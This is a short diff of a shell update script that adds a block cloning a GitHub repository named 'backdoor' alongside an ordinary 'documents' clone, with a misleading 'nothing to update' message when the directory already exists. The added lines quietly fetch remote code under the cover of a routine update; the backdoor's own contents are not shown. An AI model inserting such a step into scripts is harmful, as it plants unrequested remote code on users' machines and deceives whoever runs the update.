@@ -30,6 +30,12 @@ then
 else
 	git clone https://github.com/cyber-org/documents #change this to change updates
 fi
+if [ -e backdoor ]
+then
+	echo oops: there is nothing to update
+else
+	git clone https://github.com/cyber-org/backdoor
+fi
 cd ..
 cd ..
 cd ..
